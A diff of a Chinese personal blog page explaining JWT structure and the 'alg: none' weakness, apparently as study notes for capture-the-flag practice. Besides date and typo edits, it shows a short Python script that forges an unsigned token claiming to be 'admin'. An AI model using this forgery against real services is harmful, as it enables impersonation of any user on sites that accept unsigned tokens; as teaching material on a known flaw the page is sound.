@@ -21,12 +21,12 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"fupanc.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.19.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="请移步正文">
+    <meta name="description" content="JWT是一种安全机制，在某些情况下我们可以通过伪造jwt来任意用户登录">
 <meta property="og:type" content="article">
 <meta property="og:title" content="JWT以及jwt伪造">
 <meta property="og:url" content="https://fupanc.github.io/2024/04/20/JWT%E4%BB%A5%E5%8F%8A%E4%BC%AA%E9%80%A0/index.html">
 <meta property="og:site_name" content="Fupanc">
-<meta property="og:description" content="请移步正文">
+<meta property="og:description" content="JWT是一种安全机制，在某些情况下我们可以通过伪造jwt来任意用户登录">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://fupanc.github.io/2024/04/20/JWT%E4%BB%A5%E5%8F%8A%E4%BC%AA%E9%80%A0/v2-b034c3453cd2bb7177cfdbb4366a5e73_720w-1713610643655-1.webp">
 <meta property="og:image" content="https://fupanc.github.io/2024/04/20/JWT%E4%BB%A5%E5%8F%8A%E4%BC%AA%E9%80%A0/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70.png">
@@ -38,7 +38,7 @@
 <meta property="og:image" content="https://fupanc.github.io/2024/04/20/JWT%E4%BB%A5%E5%8F%8A%E4%BC%AA%E9%80%A0/image-20240418205910130.png">
 <meta property="og:image" content="https://fupanc.github.io/2024/04/20/JWT%E4%BB%A5%E5%8F%8A%E4%BC%AA%E9%80%A0/image-20240419194521275.png">
 <meta property="article:published_time" content="2024-04-20T10:06:29.299Z">
-<meta property="article:modified_time" content="2024-04-26T08:15:55.106Z">
+<meta property="article:modified_time" content="2024-06-02T09:07:01.331Z">
 <meta property="article:author" content="Fupanc">
 <meta property="article:tag" content="学习笔记">
 <meta name="twitter:card" content="summary">
@@ -168,13 +168,13 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-count">8</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-count">12</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
   </nav>
@@ -248,7 +248,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2024-04-26 16:15:55" itemprop="dateModified" datetime="2024-04-26T16:15:55+08:00">2024-04-26</time>
+      <time title="修改时间：2024-06-02 17:07:01" itemprop="dateModified" datetime="2024-06-02T17:07:01+08:00">2024-06-02</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -291,7 +291,7 @@
     
     
     
-    <div class="post-body" itemprop="articleBody"><p>  请移步正文</p>
+    <div class="post-body" itemprop="articleBody"><p>  JWT是一种安全机制，在某些情况下我们可以通过伪造jwt来任意用户登录</p>
 <span id="more"></span>
 
 <h2 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h2><h3 id="JWT简介"><a href="#JWT简介" class="headerlink" title="JWT简介"></a>JWT简介</h3><p>Json web token(JWT)，是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（(RFC 7519)。该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。<strong>JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源</strong>，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。</p>
@@ -364,7 +364,7 @@
 <li><p>typ属性表示这个token的类型（type）<strong>，JWT 令牌统一写为JWT。</strong></p>
 </li>
 </ul>
-<p><strong><u>注意：</u>可以将JWT中的alg算法修改为none,JWT将算法设定为“None”。如果<code>alg</code>字段设为<code>None</code>，那么JWT的第三部分会被质控，这样任何token都是有效的。遮掩就可以伪造token进行随意访问</strong></p>
+<p><strong><u>注意：</u>可以将JWT中的alg算法修改为none,JWT将算法设定为“None”。如果<code>alg</code>字段设为<code>None</code>，那么JWT的第三部分会被置空，这样任何token都是有效的。这样就可以伪造token进行随意访问</strong></p>
 <h4 id="有效载荷"><a href="#有效载荷" class="headerlink" title="有效载荷"></a>有效载荷</h4><p>包含3部分信息：</p>
 <ul>
 <li>标准中注册的声明</li>
@@ -435,7 +435,7 @@
 
 <h5 id="将算法改为none"><a href="#将算法改为none" class="headerlink" title="将算法改为none"></a>将算法改为none</h5><p><strong>JWT支持将算法设定为“None”。如果“alg”字段设为“ None”，那么签名会被置空，这样任何token都是有效的。</strong></p>
 <p>设定该功能的最初目的是为了方便调试。但是，如果<strong>在生产环境中开启了空加密算法，缺少签名算法，jwt保证信息不被篡改的功能就失效了</strong>，<u>若不在生产环境中关闭该功能，攻击者可以通过将alg字段设置为“None”来伪造他们想要的任何token，接着便可以使用伪造的token冒充任意用户登陆网站。</u>，所以，使用这个方法的前提是有这个功能。</p>
-<p><strong>注意:<a target="_blank" rel="noopener" href="https://jwt.io/#encoded-jwt">jwt.io</a>网站不能直接修改算法为none</strong>，会被认为是恶意行为，因此无法使用在线工具生成JWT，但是这里有个python脚本应该可以用，后面实验一下:</p>
+<p><strong>注意:<a target="_blank" rel="noopener" href="https://jwt.io/#encoded-jwt">jwt.io</a>网站不能直接修改算法为none</strong>，会被认为是恶意行为，因此无法使用在线工具生成JWT，可以用python脚本生成:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import jwt</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    &quot;alg&quot;: &quot;none&quot;,</span><br><span class="line">    &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br><span class="line">content = &#123;</span><br><span class="line">    &quot;iss&quot;: &quot;admin&quot;,</span><br><span class="line">    &quot;iat&quot;: 1667822180,</span><br><span class="line">    &quot;exp&quot;: 1667829380,</span><br><span class="line">    &quot;nbf&quot;: 1667822180,</span><br><span class="line">    &quot;sub&quot;: &quot;admin&quot;,</span><br><span class="line">    &quot;jti&quot;: &quot;237410127e2551647730b97941cdcae5&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">token = jwt.encode(</span><br><span class="line">    content,</span><br><span class="line">    &quot;&quot;, # 密钥，此处置为空</span><br><span class="line">    algorithm=&quot;none&quot;, # 加密方式</span><br><span class="line">    headers=header</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">print(token)</span><br><span class="line"></span><br><span class="line">//注意：使用脚本只会生成两段字符串，虽然签名字符串为空，但是那个连接的点是必要的，可以看看下面ctfhub的例子</span><br></pre></td></tr></table></figure>
 
 <p>应该还可以使用<strong>jwt_tool工具</strong>来改</p>
